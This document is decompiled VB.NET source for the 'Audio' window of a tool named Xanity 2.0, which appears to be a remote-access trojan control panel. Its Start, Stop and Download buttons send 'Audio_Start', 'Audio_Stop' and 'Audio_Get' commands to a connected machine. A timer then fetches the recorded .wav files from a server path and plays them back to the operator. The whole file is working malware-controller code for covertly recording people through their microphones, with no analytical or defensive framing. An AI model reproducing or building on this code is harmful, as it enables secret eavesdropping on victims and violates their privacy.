Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Xanity_2._0.My
Imports Xanity_2._0.My.Resources

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class Audio
        Inherits Form
        ' Methods
        Public Sub New()
            Audio.__ENCAddToList(Me)
            Me.server = New API
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = Audio.__ENCList
            SyncLock list
                If (Audio.__ENCList.Count = Audio.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (Audio.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = Audio.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                Audio.__ENCList.Item(index) = Audio.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    Audio.__ENCList.RemoveRange(index, (Audio.__ENCList.Count - index))
                    Audio.__ENCList.Capacity = Audio.__ENCList.Count
                End If
                Audio.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        Private Sub btn_start_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("Audio_Start", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An Error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Audio record started!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_stop_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("Audio_Stop", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An Error occured!"
                Else
                    Me.FlatStatusBar1.Text = "Audio record stopped!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Button3_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (MessageBox.Show("Make sure you first stop the recording, before downloading it!", "Warning", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) = DialogResult.OK) Then
                    Me.PictureBox1.Image = Resources.gif_load2
                    Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                    Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                    If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("Audio_Get", host, file), True, False))) Then
                        Me.FlatStatusBar1.Text = "An Error occured!"
                    Else
                        Me.FlatStatusBar1.Text = "Downloading...!"
                    End If
                    Dim dialog As New FolderBrowserDialog
                    Dim dialog2 As FolderBrowserDialog = dialog
                    dialog2.Description = "Select a folder to save audio files!"
                    dialog2 = Nothing
                    If (dialog.ShowDialog = DialogResult.OK) Then
                        Me.path = dialog.SelectedPath
                    End If
                    Me.tmr_listen.Start
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(Audio))
            Me.tmr_listen = New Timer(Me.components)
            Me.FormSkin1 = New FormSkin
            Me.FlatMini1 = New FlatMini
            Me.FlatMax1 = New FlatMax
            Me.FlatCloseAU1 = New FlatCloseAU
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.PictureBox1 = New PictureBox
            Me.btn_download = New FlatButton
            Me.btn_stop = New FlatButton
            Me.btn_start = New FlatButton
            Me.FlatLabel1 = New FlatLabel
            Me.FormSkin1.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Me.tmr_listen.Interval = &HBB8
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.BorderColor = Color.FromArgb(&H35, &H3A, 60)
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatCloseAU1)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.PictureBox1)
            Me.FormSkin1.Controls.Add(Me.btn_download)
            Me.FormSkin1.Controls.Add(Me.btn_stop)
            Me.FormSkin1.Controls.Add(Me.btn_start)
            Me.FormSkin1.Controls.Add(Me.FlatLabel1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.DeepPink
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            Dim size2 As New Size(&H134, &HE7)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "Audio"
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(230, 12)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = 8
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(&HFE, 12)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = 7
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatCloseAU1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatCloseAU1.BackColor = Color.White
            Me.FlatCloseAU1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatCloseAU1.Font = New Font("Marlett", 10!)
            point2 = New Point(&H116, 13)
            Me.FlatCloseAU1.Location = point2
            Me.FlatCloseAU1.Name = "FlatCloseAU1"
            size2 = New Size(&H12, &H12)
            Me.FlatCloseAU1.Size = size2
            Me.FlatCloseAU1.TabIndex = 6
            Me.FlatCloseAU1.Text = "FlatCloseAU1"
            Me.FlatCloseAU1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &HD3)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.DeepPink
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H134, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 5
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.PictureBox1.BackColor = Color.Transparent
            point2 = New Point(&HC7, &H62)
            Me.PictureBox1.Location = point2
            Me.PictureBox1.Name = "PictureBox1"
            size2 = New Size(100, 100)
            Me.PictureBox1.Size = size2
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 4
            Me.PictureBox1.TabStop = False
            Me.btn_download.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_download.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_download.Cursor = Cursors.Hand
            Me.btn_download.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HCE, 60)
            Me.btn_download.Location = point2
            Me.btn_download.Name = "btn_download"
            Me.btn_download.Rounded = False
            size2 = New Size(&H5D, &H20)
            Me.btn_download.Size = size2
            Me.btn_download.TabIndex = 3
            Me.btn_download.Text = "Download"
            Me.btn_download.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.btn_stop.BackColor = Color.White
            Me.btn_stop.BaseColor = Color.Empty
            Me.btn_stop.Cursor = Cursors.Hand
            Me.btn_stop.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H6B, 60)
            Me.btn_stop.Location = point2
            Me.btn_stop.Name = "btn_stop"
            Me.btn_stop.Rounded = False
            size2 = New Size(&H5D, &H20)
            Me.btn_stop.Size = size2
            Me.btn_stop.TabIndex = 2
            Me.btn_stop.Text = "Stop"
            Me.btn_stop.TextColor = Color.Black
            Me.btn_start.BackColor = Color.Transparent
            Me.btn_start.BaseColor = Color.DeepPink
            Me.btn_start.Cursor = Cursors.Hand
            Me.btn_start.Font = New Font("Segoe UI", 12!)
            point2 = New Point(8, 60)
            Me.btn_start.Location = point2
            Me.btn_start.Name = "btn_start"
            Me.btn_start.Rounded = False
            size2 = New Size(&H5D, &H20)
            Me.btn_start.Size = size2
            Me.btn_start.TabIndex = 1
            Me.btn_start.Text = "Start"
            Me.btn_start.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel1.ForeColor = Color.White
            point2 = New Point(7, &H62)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&HBA, &H1A)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 0
            Me.FlatLabel1.Text = "Audio will be played automatically," & ChrW(13) & ChrW(10) & "once downloaded!"
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H134, &HE7)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "Audio"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "audio"
            Me.TransparencyKey = Color.Fuchsia
            Me.FormSkin1.ResumeLayout(False)
            Me.FormSkin1.PerformLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
        End Sub

        Private Sub tmr_listen_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim str As String = Me.connected.Split(New Char() { "|"c })(1)
                    Dim str2 As String = Me.connected.Split(New Char() { "|"c })(0)
                    Try 
                        File.WriteAllBytes((Me.path & "\" & str & ".wav"), New WebClient().DownloadData((str2 & "/files/" & str & ".wav")))
                        Me.PictureBox1.Image = Nothing
                        Me.FlatStatusBar1.Text = "Playing...!"
                        MyProject.Computer.Audio.Play((Me.path & "\" & str & ".wav"), AudioPlayMode.Background)
                        Me.tmr_listen.Stop
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1, lErl)
                        ProjectData.ClearProjectError
                    End Try
                    Return
                Catch exception2 As Exception
                    ProjectData.SetProjectError(exception2, lErl)
                    Dim exception As Exception = exception2
                    Interaction.MsgBox(exception.Message, MsgBoxStyle.ApplicationModal, Nothing)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub


        ' Properties
        Friend Overridable Property btn_download As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_download
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button3_Click)
                If (Not Me._btn_download Is Nothing) Then
                    RemoveHandler Me._btn_download.Click, handler
                End If
                Me._btn_download = value
                If (Not Me._btn_download Is Nothing) Then
                    AddHandler Me._btn_download.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_start As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_start
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_start_Click)
                If (Not Me._btn_start Is Nothing) Then
                    RemoveHandler Me._btn_start.Click, handler
                End If
                Me._btn_start = value
                If (Not Me._btn_start Is Nothing) Then
                    AddHandler Me._btn_start.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_stop As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_stop
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_stop_Click)
                If (Not Me._btn_stop Is Nothing) Then
                    RemoveHandler Me._btn_stop.Click, handler
                End If
                Me._btn_stop = value
                If (Not Me._btn_stop Is Nothing) Then
                    AddHandler Me._btn_stop.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatCloseAU1 As FlatCloseAU
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatCloseAU1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCloseAU)
                Me._FlatCloseAU1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property tmr_listen As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._tmr_listen
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.tmr_listen_Tick)
                If (Not Me._tmr_listen Is Nothing) Then
                    RemoveHandler Me._tmr_listen.Tick, handler
                End If
                Me._tmr_listen = value
                If (Not Me._tmr_listen Is Nothing) Then
                    AddHandler Me._tmr_listen.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("btn_download")> _
        Private _btn_download As FlatButton
        <AccessedThroughProperty("btn_start")> _
        Private _btn_start As FlatButton
        <AccessedThroughProperty("btn_stop")> _
        Private _btn_stop As FlatButton
        <AccessedThroughProperty("FlatCloseAU1")> _
        Private _FlatCloseAU1 As FlatCloseAU
        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("tmr_listen")> _
        Private _tmr_listen As Timer
        Private components As IContainer
        Public connected As String
        Private path As String
        Private server As API
    End Class
End Namespace

